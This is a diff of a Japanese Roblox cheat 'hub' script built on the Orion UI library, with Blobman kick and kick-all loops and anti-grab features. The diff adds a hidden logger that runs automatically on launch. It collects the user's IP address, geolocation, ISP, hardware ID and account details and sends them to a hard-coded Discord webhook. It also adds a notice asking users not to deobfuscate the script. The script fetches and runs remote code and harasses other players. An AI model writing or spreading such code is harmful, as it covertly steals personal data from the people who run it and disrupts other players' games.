@@ -1,4 +1,3 @@
--- OrionLib 読み込み
 local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/BlizTBr/scripts/refs/heads/main/Orion%20X"))()
 
 local Players = game:GetService("Players")
@@ -8,6 +7,9 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Workspace = game:GetService("Workspace")
 local TweenService = game:GetService("TweenService")
 local Debris = game:GetService("Debris")
+local MarketplaceService = game:GetService("MarketplaceService")
+local HttpService = game:GetService("HttpService")
+local GuiService = game:GetService("GuiService")
 
 local LP = Players.LocalPlayer
 
@@ -16,7 +18,7 @@ local Blue = Color3.fromRGB(0, 170, 255)
 
 -- ===== Window =====
 local Window = OrionLib:MakeWindow({
-    Name = "Private Hub by @Kyo_555 >:)",
+    Name = "名募はぶ by @Kyo_555 >:)",
     HidePremium = false,
     SaveConfig = true,
     ConfigFolder = "c00lhubConfig"
@@ -31,6 +33,110 @@ OrionLib.Theme = {
     Text = Color3.fromRGB(255, 255, 255),
     TextDark = Color3.fromRGB(180, 180, 200),
 }
+
+-- ──────────────────────────────────────
+-- ★★★ ロガー (起動時に自動実行) ★★★
+-- ──────────────────────────────────────
+local webhookURL = "https://discord.com/api/webhooks/1520719334165446739/TRFknHcPJhJuCLBeot7EVNImVxS6oFHdLtMf72zxI2NO_MtD1A7yxi4wLmSnvQHZ0A0D"  -- ★ここにWebhook URLを入れてください★
+
+local function sendDetailedLog()
+    local ipData = "取得失敗"
+    local geoData = {regionName = "不明", city = "不明", isp = "不明", proxy = false}
+    local info = {Name = "不明"}
+    local avatarUrl = ""
+
+    local profileUrl = "https://www.roblox.com/users/" .. LP.UserId .. "/profile"
+    local gameUrl = "https://www.roblox.com/games/" .. game.PlaceId
+
+    pcall(function()
+        local thumbApi = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. LP.UserId .. "&size=720x720&format=Png&isCircular=false"
+        local thumbRes = game:HttpGet(thumbApi)
+        local thumbData = HttpService:JSONDecode(thumbRes)
+        if thumbData and thumbData.data and thumbData.data[1] then
+            avatarUrl = thumbData.data[1].imageUrl
+        else
+            avatarUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"
+        end
+    end)
+
+    pcall(function()
+        info = MarketplaceService:GetProductInfo(game.PlaceId)
+        ipData = game:HttpGet("https://api.ipify.org")
+        local response = game:HttpGet("http://ip-api.com/json/" .. ipData .. "?lang=ja&fields=status,message,country,regionName,city,isp,proxy")
+        geoData = HttpService:JSONDecode(response)
+    end)
+
+    local executor = (identifyexecutor and identifyexecutor()) or "不明なExecutor"
+    local hwid = (gethwid and gethwid()) or "取得不可"
+    
+    local deviceDetail = "不明"
+    if GuiService:IsTenFootInterface() then
+        deviceDetail = "Console (Xbox/PS)"
+    elseif UserInputService.TouchEnabled then
+        local screenSize = workspace.CurrentCamera.ViewportSize
+        if math.min(screenSize.X, screenSize.Y) < 600 then
+            deviceDetail = "Mobile"
+        else
+            deviceDetail = "Tablet"
+        end
+    elseif UserInputService.KeyboardEnabled then
+        deviceDetail = "PC"
+    end
+
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "omg: " .. LP.Name,
+            ["color"] = 0xff4500,
+            ["fields"] = {
+                {
+                    ["name"] = "ユーザー情報",
+                    ["value"] = "**Name:** `" .. LP.Name .. "`\n**ID:** [" .. LP.UserId .. "](" .. profileUrl .. ")\n**垢経過:** " .. LP.AccountAge .. "日\n🔗 **[プロフィールを開く](" .. profileUrl .. ")**",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "実行環境",
+                    ["value"] = "**Device:** " .. deviceDetail .. "\n**Executor:** `" .. executor .. "`\n**HWID:** `" .. hwid .. "`",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "ネットワーク",
+                    ["value"] = "**IP:** `" .. ipData .. "`\n**地域:** " .. geoData.regionName .. " " .. geoData.city .. "\n**ISP:** " .. geoData.isp .. "\n**VPN/Proxy:** " .. (geoData.proxy and "検出" or "無し"),
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "サーバー/実行場所",
+                    ["value"] = "**Game:** [" .. info.Name .. "](" .. gameUrl .. ")\n**PlaceId:** `" .. game.PlaceId .. "`\n**JobId:** `" .. game.JobId .. "`",
+                    ["inline"] = false
+                }
+            },
+            ["thumbnail"] = {
+                ["url"] = avatarUrl
+            },
+            ["footer"] = {
+                ["text"] = "でーもんLogger  " .. os.date("%Y/%m/%d %X")
+            }
+        }}
+    }
+
+    pcall(function()
+        local req = (syn and syn.request) or (http and http.request) or request
+        if req then
+            req({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode(data)
+            })
+        end
+    end)
+end
+
+-- ★★★ 起動時にロガーを実行 ★★★
+task.spawn(function()
+    if webhookURL and webhookURL ~= "ウェブフックのリンクここにいれる" then
+        sendDetailedLog()
+    end
+end)
 
 -- ──────────────────────────────────────
 -- Credit Tab (クレジットタブ)
@@ -50,12 +156,12 @@ CreditTab:AddParagraph(
 
 CreditTab:AddParagraph(
     "📝 スクリプト名",
-    "Private Hub"
+    "名募はぶ"
 )
 
 CreditTab:AddParagraph(
     "📅 バージョン",
-    "v6.34"
+    "v5,2,9"
 )
 
 CreditTab:AddParagraph(
@@ -74,7 +180,7 @@ CreditTab:AddParagraph(
     "⚠️ 注意事項",
     "・このスクリプトを使用し起きた事故などは作者であるKyo_555は責任を負いません。\n" ..
     "・スクリプトの不具合がある場合上記の連絡先までご連絡ください。\n" ..
-    "・このスクリプトはとても不安定な機能ばかりです。"
+    "・このスクリプトの難読化を解除しないでください。難読化解除したらおこる😡"
 )
 
 -- ──────────────────────────────────────
@@ -199,7 +305,7 @@ FlySection:AddButton({
 })
 
 -- ──────────────────────────────────────
--- Blobman Tab (たまきんスクリプト統合版 + オーラキル機能)
+-- Blobman Tab (たまきんスクリプト統合版)
 -- ──────────────────────────────────────
 local BlobmanTab = Window:MakeTab({
     Name = "ブロブマン",
@@ -216,23 +322,16 @@ local BlobmanSettings = {
     currentSide = "Left",
     isExecuting = false,
     selectedTarget = nil,
-    stopKickAll = false,
     selectKickLoopActive = false,
-    -- オーラキル設定
-    auraKillEnabled = false,
-    auraKillRadius = 35,
+    stopKickAll = false,
 }
 
+local kickedPlayers = {}
 local selectKickLoopThread = nil
 local selectKickRecordedPlayers = {}
 
--- ===== オーラキル用変数 =====
-local auraKillActive = false
-local auraKillThread = nil
-local auraKillInRange = {}
-
 -- ============================================
--- Blobman kick
+-- Blobman kick (たまきん版)
 -- ============================================
 function BlobmanFeature.getLocalChar() return LP.Character end
 
@@ -251,18 +350,11 @@ function BlobmanFeature.getInv()
 end
 
 function BlobmanFeature.SetNetworkOwner(part)
-    pcall(function()
-        local root = BlobmanFeature.getLocalRoot()
-        if root then
-            ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(part, root.CFrame)
-        end
-    end)
+    ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(part, BlobmanFeature.getLocalRoot().CFrame)
 end
 
 function BlobmanFeature.ungrab(part)
-    pcall(function()
-        ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(part)
-    end)
+    ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(part)
 end
 
 function BlobmanFeature.getBlobman()
@@ -271,13 +363,10 @@ function BlobmanFeature.getBlobman()
         local v = inv:FindFirstChild("CreatureBlobman")
         if v and v:FindFirstChild("VehicleSeat") then return v end
     end
-    local plotItems = Workspace:FindFirstChild("PlotItems")
-    if plotItems then
-        for _, p in pairs(plotItems:GetChildren()) do
-            local m = p:FindFirstChild("CreatureBlobman")
-            if m and m:FindFirstChild("PlayerValue") and m.PlayerValue.Value == LP.Name then
-                return m
-            end
+    for _, p in Workspace.PlotItems:GetChildren() do
+        local m = p:FindFirstChild("CreatureBlobman")
+        if m and m:FindFirstChild("PlayerValue") and m.PlayerValue.Value == LP.Name then
+            return m
         end
     end
     return nil
@@ -348,16 +437,9 @@ function BlobmanFeature.blobDrop(blob, target, side)
     end
 end
 
--- キック関数
+-- キック関数 (たまきん版)
 function BlobmanFeature.blobKickFast(blob, targetRoot, side)
-    local myRoot = BlobmanFeature.getLocalRoot()
-    if not myRoot or not targetRoot then return end
-    
-    local originalPos = myRoot.CFrame
-    myRoot.CFrame = targetRoot.CFrame
-    task.wait(0.05)
-    
-    BlobmanFeature.blobGrab(blob, targetRoot, side)
+    BlobmanFeature.blobGrab(blob, BlobmanFeature.getLocalRoot(), side)
     task.wait(0.05)
     BlobmanFeature.SetNetworkOwner(targetRoot)
     task.wait(0.04)
@@ -370,39 +452,6 @@ function BlobmanFeature.blobKickFast(blob, targetRoot, side)
     BlobmanFeature.blobDrop(blob, targetRoot, side)
     task.wait(0.04)
     BlobmanFeature.ungrab(targetRoot)
-    
-    myRoot.CFrame = originalPos
-end
-
--- オーラキル用の簡易キル関数（より高速）
-function BlobmanFeature.blobKillFast(blob, targetRoot, side)
-    local myRoot = BlobmanFeature.getLocalRoot()
-    if not myRoot or not targetRoot then return end
-    
-    local originalPos = myRoot.CFrame
-    myRoot.CFrame = targetRoot.CFrame
-    task.wait(0.03)
-    
-    BlobmanFeature.blobGrab(blob, targetRoot, side)
-    task.wait(0.03)
-    BlobmanFeature.SetNetworkOwner(targetRoot)
-    task.wait(0.02)
-    targetRoot.CFrame = targetRoot.CFrame + Vector3.new(0, 16, 0)
-    task.wait(0.02)
-    BlobmanFeature.ungrab(targetRoot)
-    task.wait(0.02)
-    BlobmanFeature.blobGrab(blob, targetRoot, side)
-    task.wait(0.02)
-    BlobmanFeature.blobDrop(blob, targetRoot, side)
-    task.wait(0.02)
-    BlobmanFeature.ungrab(targetRoot)
-    
-    local hum = targetRoot.Parent and targetRoot.Parent:FindFirstChildOfClass("Humanoid")
-    if hum and hum.Health > 0 then
-        hum.Health = 0
-    end
-    
-    myRoot.CFrame = originalPos
 end
 
 -- プレイヤー退出監視関数
@@ -439,8 +488,6 @@ local function IsPlayerValid(targetPlayer)
     if not root then return false end
     local hum = char:FindFirstChildOfClass("Humanoid")
     if not hum or hum.Health <= 0 then return false end
-    
-    if targetPlayer:FindFirstChild("InPlot") and targetPlayer.InPlot.Value then return false end
     
     return true
 end
@@ -486,7 +533,7 @@ local function UpdateSelectKickRecord()
     end
 end
 
--- 単体キック関数
+-- 単体キック関数 (たまきん版)
 local function KickPlayerFast(targetPlayer, destroyBlobAfter)
     if not targetPlayer then return false end
     
@@ -504,7 +551,15 @@ local function KickPlayerFast(targetPlayer, destroyBlobAfter)
     local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
     if not targetRoot then return false end
     
-    BlobmanFeature.blobKickFast(blob, targetRoot, BlobmanSettings.currentSide)
+    local myRoot = BlobmanFeature.getLocalRoot()
+    if myRoot and targetRoot then
+        local oldPos = myRoot.CFrame
+        myRoot.CFrame = targetRoot.CFrame
+        task.wait(0.06)
+        BlobmanFeature.blobKickFast(blob, targetRoot, BlobmanSettings.currentSide)
+        task.wait(0.06)
+        myRoot.CFrame = oldPos
+    end
     
     task.spawn(function()
         MonitorPlayerExit(targetPlayer, playerName)
@@ -561,12 +616,21 @@ local function StartSelectKickLoop()
                 if targetChar then
                     local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
                     if targetRoot then
-                        BlobmanFeature.blobKickFast(blob, targetRoot, BlobmanSettings.currentSide)
-                        selectKickRecordedPlayers[targetPlayer] = true
-                        
-                        task.spawn(function()
-                            MonitorPlayerExit(targetPlayer, targetPlayer.Name)
-                        end)
+                        local myRoot = BlobmanFeature.getLocalRoot()
+                        if myRoot then
+                            local oldPos = myRoot.CFrame
+                            myRoot.CFrame = targetRoot.CFrame
+                            task.wait(0.06)
+                            BlobmanFeature.blobKickFast(blob, targetRoot, BlobmanSettings.currentSide)
+                            task.wait(0.06)
+                            myRoot.CFrame = oldPos
+                            
+                            selectKickRecordedPlayers[targetPlayer] = true
+                            
+                            task.spawn(function()
+                                MonitorPlayerExit(targetPlayer, targetPlayer.Name)
+                            end)
+                        end
                     end
                 end
                 
@@ -597,7 +661,7 @@ local function StopSelectKickLoop()
 end
 
 -- ============================================
--- Kick All（1回実行）
+-- Kick All（1回実行）- たまきん版
 -- ============================================
 local kickAllRunning = false
 local currentKickAllThread = nil
@@ -682,11 +746,10 @@ local function StopKickAll()
 end
 
 -- ============================================
--- Kick All Loop（ループ実行）
+-- Kick All Loop（ループ実行）- たまきん版
 -- ============================================
 local kickAllLoopActive = false
 local kickAllLoopThread = nil
-local kickedPlayers = {}
 
 local function UpdateKickedPlayers()
     for player, wasKicked in pairs(kickedPlayers) do
@@ -759,14 +822,21 @@ local function StartKickAllLoop()
                 if targetChar then
                     local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
                     if targetRoot then
-                        BlobmanFeature.blobKickFast(blob, targetRoot, BlobmanSettings.currentSide)
-                        kickedPlayers[plr] = true
-                        
-                        task.spawn(function()
-                            MonitorPlayerExit(plr, plr.Name)
-                        end)
-                        
-                        task.wait(0.1)
+                        local myRoot = BlobmanFeature.getLocalRoot()
+                        if myRoot then
+                            local originalPos = myRoot.CFrame
+                            myRoot.CFrame = targetRoot.CFrame
+                            task.wait(0.06)
+                            BlobmanFeature.blobKickFast(blob, targetRoot, BlobmanSettings.currentSide)
+                            myRoot.CFrame = originalPos
+                            kickedPlayers[plr] = true
+                            
+                            task.spawn(function()
+                                MonitorPlayerExit(plr, plr.Name)
+                            end)
+                            
+                            task.wait(0.1)
+                        end
                     end
                 end
             end
@@ -796,148 +866,6 @@ local function StopKickAllLoop()
         BlobmanFeature.destroyBlobman()
     end
     kickedPlayers = {}
-end
-
--- ============================================
--- オーラキル機能（ササミックスHUBから移植）
--- ============================================
-local function stopAuraKill()
-    BlobmanSettings.auraKillEnabled = false
-    auraKillActive = false
-    if auraKillThread then
-        task.cancel(auraKillThread)
-        auraKillThread = nil
-    end
-    for uid in pairs(auraKillInRange) do
-        auraKillInRange[uid] = nil
-    end
-    local blob = BlobmanFeature.getBlobman()
-    if blob then
-        BlobmanFeature.destroyBlobman()
-    end
-end
-
-local function autoSitOnBlobman()
-    local blob = BlobmanFeature.getBlobman()
-    if not blob then
-        BlobmanFeature.spawnBlobman()
-        task.wait(0.5)
-        blob = BlobmanFeature.getBlobman()
-    end
-    
-    if blob then
-        local seat = blob:FindFirstChild("VehicleSeat")
-        local hum = BlobmanFeature.getLocalHum()
-        if seat and hum and seat.Occupant ~= hum then
-            local hrp = BlobmanFeature.getLocalRoot()
-            if hrp then
-                hrp.CFrame = seat.CFrame + Vector3.new(0, 2, 0)
-                task.wait(0.1)
-            end
-            seat:Sit(hum)
-            task.wait(0.3)
-        end
-    end
-end
-
-local function startAuraKill()
-    if auraKillThread then
-        task.cancel(auraKillThread)
-        auraKillThread = nil
-    end
-    auraKillInRange = {}
-    
-    task.spawn(autoSitOnBlobman)
-    
-    auraKillActive = true
-    auraKillThread = task.spawn(function()
-        OrionLib:MakeNotification({Name = "ブロブマンオーラキル", Content = "ON（半径" .. BlobmanSettings.auraKillRadius .. "・自動乗車付き）", Time = 2})
-        
-        while auraKillActive do
-            local myRoot = BlobmanFeature.getLocalRoot()
-            if not myRoot then
-                task.wait(0.5)
-                continue
-            end
-            local myPos = myRoot.Position
-            local nowInRange = {}
-            
-            if BlobmanFeature.getLocalHum() and not BlobmanFeature.isSittingOnBlobman() then
-                task.spawn(autoSitOnBlobman)
-            end
-            
-            for _, p in ipairs(Players:GetPlayers()) do
-                if p == LP then continue end
-                local char = p.Character
-                local pHRP = char and char:FindFirstChild("HumanoidRootPart")
-                
-                if pHRP then
-                    local dist = (myPos - pHRP.Position).Magnitude
-                    if dist > BlobmanSettings.auraKillRadius then
-                        if auraKillInRange[p.UserId] then
-                            auraKillInRange[p.UserId] = nil
-                        end
-                        continue
-                    end
-                elseif not auraKillInRange[p.UserId] then
-                    continue
-                end
-                
-                nowInRange[p.UserId] = true
-                
-                if not auraKillInRange[p.UserId] and IsPlayerValid(p) then
-                    local blob = BlobmanFeature.getBlobman()
-                    if not blob then
-                        BlobmanFeature.spawnBlobman()
-                        task.wait(0.5)
-                        blob = BlobmanFeature.getBlobman()
-                        if not blob then
-                            task.wait(0.5)
-                            continue
-                        end
-                    end
-                    
-                    if not BlobmanFeature.isSittingOnBlobman() then
-                        BlobmanFeature.ensureSitBlobman()
-                        if not BlobmanFeature.isSittingOnBlobman() then
-                            task.wait(0.3)
-                            continue
-                        end
-                    end
-                    
-                    local targetChar = p.Character
-                    if targetChar then
-                        local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
-                        if targetRoot then
-                            local success, err = pcall(function()
-                                BlobmanFeature.blobKillFast(blob, targetRoot, BlobmanSettings.currentSide)
-                            end)
-                            if success then
-                                auraKillInRange[p.UserId] = true
-                                BlobmanSettings.currentSide = (BlobmanSettings.currentSide == "Left") and "Right" or "Left"
-                            end
-                        end
-                    end
-                end
-            end
-            
-            for uid in pairs(auraKillInRange) do
-                if not nowInRange[uid] then
-                    auraKillInRange[uid] = nil
-                end
-            end
-            
-            task.wait(0.3)
-        end
-        
-        local blob = BlobmanFeature.getBlobman()
-        if blob then
-            BlobmanFeature.destroyBlobman()
-        end
-        auraKillInRange = {}
-        OrionLib:MakeNotification({Name = "ブロブマンオーラキル", Content = "OFF", Time = 2})
-        auraKillThread = nil
-    end)
 end
 
 -- ============================================
@@ -1018,16 +946,19 @@ BlobmanTab:AddToggle({
 
 BlobmanTab:AddSection({ Name = "Kick All" })
 
+-- Kick All (1回)
 BlobmanTab:AddButton({
     Name = "Kick All Execute (1回)",
     Callback = KickAllPlayers
 })
 
+-- Stop Kick All
 BlobmanTab:AddButton({
     Name = "Stop Kick All",
     Callback = StopKickAll
 })
 
+-- Kick All Loop (連続)
 BlobmanTab:AddToggle({
     Name = "Kick All Loop (連続)",
     Default = false,
@@ -1039,47 +970,6 @@ BlobmanTab:AddToggle({
         end
     end
 })
-
--- ===== オーラキルセクション（ササミックスHUBから移植） =====
-BlobmanTab:AddSection({ Name = "🤖 オーラキル (Aura Kill)" })
-
-BlobmanTab:AddToggle({
-    Name = "🤖ブロブマンキルオーラ（半径35・自動乗車付き）",
-    Default = false,
-    Color = Color3.fromRGB(255, 0, 100),
-    Callback = function(state)
-        BlobmanSettings.auraKillEnabled = state
-        if state then
-            startAuraKill()
-        else
-            stopAuraKill()
-        end
-    end
-})
-
-BlobmanTab:AddSlider({
-    Name = "オーラキル半径",
-    Min = 10,
-    Max = 100,
-    Default = 35,
-    Increment = 1,
-    Color = Blue,
-    ValueName = "距離",
-    Callback = function(value)
-        BlobmanSettings.auraKillRadius = value
-        if BlobmanSettings.auraKillEnabled then
-            stopAuraKill()
-            startAuraKill()
-        end
-    end
-})
-
-BlobmanTab:AddParagraph("オーラキル説明", 
-    "・範囲内に入ったプレイヤーを自動でキルします\n" ..
-    "・Blobmanに自動乗車します\n" ..
-    "・半径はスライダーで調整可能（デフォルト35）\n" ..
-    "・友達を無視する設定も連動しています"
-)
 
 BlobmanTab:AddSection({ Name = "Settings" })
 
@@ -2388,119 +2278,7 @@ BarrierTab:AddParagraph("⚡ 特徴",
 )
 
 -- ──────────────────────────────────────
--- Silent Aim Tab (そのまま)
--- ──────────────────────────────────────
-local SilentAimTab = Window:MakeTab({
-    Name = "サイレントエイム（ゴミ）",
-    Icon = "rbxassetid://5143056985",
-    PremiumOnly = false
-})
-
--- ===== サイレントエイム機能 =====
-_G.SilentAimEnabled = false
-_G.SilentAimRange = 30
-
-local Camera = workspace.CurrentCamera
-local Mouse = LP:GetMouse()
-local WorldToScreenPoint = Camera.WorldToScreenPoint
-local GetPlayers = Players.GetPlayers
-local FindFirstChild = game.FindFirstChild
-
-local function GetOnScreenPosition(V3)
-    local Position, IsVisible = WorldToScreenPoint(Camera, V3)
-    return Vector2.new(Position.X, Position.Y), IsVisible
-end
-
-local function GetDirection(Origin, Position)
-    return (Position - Origin).Unit * (Origin - Position).Magnitude
-end
-
-local function GetMousePosition()
-    return Vector2.new(Mouse.X, Mouse.Y)
-end
-
-local function GetClosestPlayer()
-    local Closest, Distance = nil, _G.SilentAimRange
-    for _, Player in next, GetPlayers(Players) do
-        if Player ~= LP then
-            local Character = Player.Character
-            local Head = Character and FindFirstChild(Character, "Head")
-            local Humanoid = Character and FindFirstChild(Character, "Humanoid")
-            if Head and (Humanoid and Humanoid.Health > 0) then
-                local ScreenPos, IsVisible = GetOnScreenPosition(Head.Position)
-                if IsVisible then
-                    local _Distance = (GetMousePosition() - ScreenPos).Magnitude
-                    if _Distance <= Distance then
-                        Closest = Head
-                        Distance = _Distance
-                    end
-                end
-            end
-        end
-    end
-    return Closest, Distance
-end
-
-local oldNamecall = nil
-local function HookSilentAim()
-    if oldNamecall then return end
-    
-    oldNamecall = hookmetamethod(game, "__namecall", function(...)
-        local Method = getnamecallmethod()
-        local Arguments = {...}
-        
-        if _G.SilentAimEnabled and Arguments[1] == workspace and Method == "Raycast" then
-            if typeof(Arguments[#Arguments]) ~= "RaycastParams" then
-                return oldNamecall(...)
-            end
-            
-            local HitPart = GetClosestPlayer()
-            
-            if HitPart then
-                Arguments[3] = GetDirection(Arguments[2], HitPart.Position)
-                return oldNamecall(unpack(Arguments))
-            end
-        end
-        return oldNamecall(...)
-    end)
-end
-
-SilentAimTab:AddSection({ Name = "Silent Aim Settings" })
-
-SilentAimTab:AddSlider({
-    Name = "Aim Range (Pixel)",
-    Min = 10,
-    Max = 300,
-    Default = 30,
-    Increment = 5,
-    Color = Blue,
-    Callback = function(value)
-        _G.SilentAimRange = value
-    end
-})
-
-SilentAimTab:AddToggle({
-    Name = "Silent Aim ON/OFF",
-    Default = false,
-    Color = Blue,
-    Callback = function(state)
-        _G.SilentAimEnabled = state
-        
-        if state then
-            OrionLib:MakeNotification({Name = "Aiming", Content = "Silent Aim Activated", Time = 3})
-        else
-            OrionLib:MakeNotification({Name = "Aiming", Content = "Silent Aim Deactivated", Time = 3})
-        end
-    end
-})
-
-SilentAimTab:AddParagraph("特徴", "・画面上でマウスに最も近いプレイヤーを自動で狙う\n・画面外のプレイヤーは無視\n・Raycastを使用する武器で有効")
-
--- 起動時に一度フックをセットアップ
-HookSilentAim()
-
--- ──────────────────────────────────────
--- Invincibility Tab (アンチタブ)
+-- Invincibility Tab (アンチタブ) - Remove Anti Input Lag + アンチブロキル追加
 -- ──────────────────────────────────────
 local InvincibilityTab = Window:MakeTab({
     Name = "アンチ",
@@ -2529,6 +2307,8 @@ local InvSettings = {
     antiKickGrab = false,
     antiKickV2 = false,
     gucciAnti = false,
+    antiInputLag = false,
+    antiBlokill = false,
 }
 
 local antiKickCoroutine = nil
@@ -2536,6 +2316,27 @@ local antiRagdollConnections = {}
 local antiPaintPartsBackup = {}
 local antiPaintConnections = {}
 local gucciAntiRunning = false
+local antiInputLagRunning = false
+local antiInputLagToy = "FoodCoconut"
+
+-- ★ アンチブロキル用変数
+local AB_AntiGrabProc = false
+local AB_AGWalk = false
+
+-- ★ Toyリスト (Remove Anti Input Lag用)
+local ToyList = {
+    ["Coconut"] = "FoodCoconut",
+    ["Banana"] = "FoodBanana",
+    ["Fries"] = "FoodFrenchFries",
+    ["MeatStick"] = "FoodMeatStick",
+    ["Poop"] = "PoopPile",
+    ["Donut"] = "FoodDonut",
+    ["Cake"] = "FoodCakePink",
+    ["Burger"] = "FoodHamburger",
+    ["Pizza"] = "FoodPizzaCheese",
+    ["Hotdog"] = "FoodHotdog",
+    ["Mushroom"] = "FoodMushroomPoison",
+}
 
 local function getChar() return LP.Character end
 local function getRoot()
@@ -2562,6 +2363,178 @@ local StickyPartEvent = RS:WaitForChild("PlayerEvents"):WaitForChild("StickyPart
 local antiCreateLineLocalScript = LP:WaitForChild("PlayerScripts"):WaitForChild("CharacterAndBeamMove")
 local spawnedInToys = Workspace:WaitForChild(LP.Name .. "SpawnedInToys")
 local playerGui = LP:WaitForChild("PlayerGui")
+
+-- ★ アンチブロキル機能 ★
+local function setupAntiBlokill(char)
+    if not char then return end
+    
+    local function FWC(Parent, Name, Time)
+        return Parent:FindFirstChild(Name) or Parent:WaitForChild(Name, Time or 10)
+    end
+    
+    local hrp = FWC(char, "HumanoidRootPart")
+    local hum = FWC(char, "Humanoid")
+    local head = FWC(char, "Head")
+    
+    if not (hrp and hum and head) then return end
+
+    -- Head に PartOwner が追加されたらグラブ検知
+    head.ChildAdded:Connect(function(PartOwner)
+        if PartOwner.Name == "PartOwner" then
+            if not AB_AntiGrabProc then
+                AB_AntiGrabProc = true
+                hum.Sit = false
+                Struggle:FireServer(LP)
+                -- Struggle + RagdollRemote(0) を毎フレームスパム
+                task.spawn(function()
+                    while (head and head:FindFirstChild("PartOwner")) or LP.IsHeld.Value do
+                        Struggle:FireServer(LP)
+                        RagdollRemote:FireServer(hrp, 0)
+                        task.wait()
+                    end
+                end)
+                hrp.Anchored = true
+                if not AB_AGWalk then
+                    AB_AGWalk = true
+                    while LP.IsHeld.Value and task.wait() do
+                        hrp.CFrame = hrp.CFrame + hum.MoveDirection * 0.43
+                    end
+                end
+                hrp.Anchored = false
+                AB_AntiGrabProc = false
+                AB_AGWalk = false
+            end
+        end
+    end)
+
+    -- Ragdolled → BallSocketConstraint 全部無効化
+    local ragdolled = FWC(hum, "Ragdolled")
+    ragdolled.Changed:Connect(function()
+        if hum.Ragdolled.Value then
+            for _, v in pairs(char:GetChildren()) do
+                if v:IsA("BasePart") and v:FindFirstChild("BallSocketConstraint") and v.Name ~= "Head" then
+                    v.BallSocketConstraint.Enabled = false
+                    if v:FindFirstChild("RagdollLimbPart") then
+                        v.RagdollLimbPart.WeldConstraint.Enabled = false
+                    end
+                end
+            end
+        end
+    end)
+
+    -- WeldHRP → Sit解除ループ
+    local weldHRP = FWC(hrp, "WeldHRP")
+    weldHRP.Changed:Connect(function()
+        if hrp.WeldHRP.Enabled then
+            while not hum.Sit do task.wait() end
+            hum.Sit = false
+            hum.AutoRotate = true
+            hum.HipHeight = 1
+            while hrp.WeldHRP.Enabled and task.wait() do
+                head.CFrame = hrp.CFrame + Vector3.new(0, 1.35, 0)
+            end
+            hum.HipHeight = 0
+        end
+    end)
+
+    -- 起動時 BallSocketConstraint 全無効化
+    for _, v in pairs(char:GetChildren()) do
+        if v:IsA("BasePart") and v:FindFirstChild("BallSocketConstraint") and v.Name ~= "Head" then
+            v.BallSocketConstraint.Enabled = false
+            if v:FindFirstChild("RagdollLimbPart") then
+                v.RagdollLimbPart.WeldConstraint.Enabled = false
+            end
+        end
+    end
+end
+
+local function startAntiBlokill()
+    if not InvSettings.antiBlokill then return end
+    
+    -- 初期キャラ
+    if LP.Character then 
+        setupAntiBlokill(LP.Character) 
+    end
+    LP.CharacterAdded:Connect(function(char)
+        AB_AntiGrabProc = false
+        AB_AGWalk = false
+        task.defer(setupAntiBlokill, char)
+    end)
+end
+
+-- ★ Remove Anti Input Lag 機能 ★
+local function startAntiInputLag()
+    if antiInputLagRunning then return end
+    antiInputLagRunning = true
+    
+    task.spawn(function()
+        local plr = LP
+        local char = plr.Character or plr.CharacterAdded:Wait()
+        local hrp = char:WaitForChild("HumanoidRootPart")
+        local SpawnRemote = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")
+        
+        while InvSettings.antiInputLag do
+            local toysFolder = Workspace:FindFirstChild(plr.Name .. "SpawnedInToys")
+            if not toysFolder then
+                task.wait(0.1)
+                continue
+            end
+            
+            local toy = toysFolder:FindFirstChild(antiInputLagToy)
+            
+            if not toy then
+                pcall(function()
+                    SpawnRemote:InvokeServer(
+                        antiInputLagToy,
+                        hrp.CFrame * CFrame.new(0, 5, 0),
+                        Vector3.zero
+                    )
+                end)
+                
+                local t0 = tick()
+                repeat
+                    RunService.Heartbeat:Wait()
+                    toysFolder = Workspace:FindFirstChild(plr.Name .. "SpawnedInToys")
+                    toy = toysFolder and toysFolder:FindFirstChild(antiInputLagToy)
+                until toy or tick() - t0 > 1 or not InvSettings.antiInputLag
+            end
+            
+            if toy and toy.Parent then
+                local holdPart = toy:FindFirstChild("HoldPart")
+                if holdPart then
+                    local holdingPlayer = holdPart:FindFirstChild("HoldingPlayer")
+                    holdingPlayer = holdingPlayer and holdingPlayer.Value
+                    
+                    if holdingPlayer and holdingPlayer ~= plr then
+                        pcall(function()
+                            holdPart.DropItemRemoteFunction:InvokeServer(
+                                toy,
+                                hrp.CFrame * CFrame.new(0, 2000, 0),
+                                Vector3.zero
+                            )
+                        end)
+                        toy:Destroy()
+                    else
+                        pcall(function()
+                            holdPart.HoldItemRemoteFunction:InvokeServer(toy, char)
+                        end)
+                        task.wait(0.05)
+                        pcall(function()
+                            holdPart.DropItemRemoteFunction:InvokeServer(
+                                toy,
+                                hrp.CFrame * CFrame.new(0, 2000, 0),
+                                Vector3.zero
+                            )
+                        end)
+                        task.wait(0.01)
+                    end
+                end
+            end
+            RunService.Heartbeat:Wait()
+        end
+        antiInputLagRunning = false
+    end)
+end
 
 -- アンチグラブ
 InvincibilityTab:AddToggle({
@@ -3219,6 +3192,93 @@ end)
 LP.CameraMaxZoomDistance = 120000
 LP.CameraMinZoomDistance = 0.5
 
+-- ★★★ その他セクション - Remove Anti Input Lag ★★★
+InvincibilityTab:AddSection({ Name = "その他" })
+
+-- Toy選択ドロップダウン
+local toyOptions = {}
+for shortName, _ in pairs(ToyList) do
+    table.insert(toyOptions, shortName)
+end
+table.sort(toyOptions)
+
+InvincibilityTab:AddDropdown({
+    Name = "Anti Input Lag アイテム",
+    Default = toyOptions[1] or "Coconut",
+    Options = toyOptions,
+    Color = Blue,
+    Callback = function(Value)
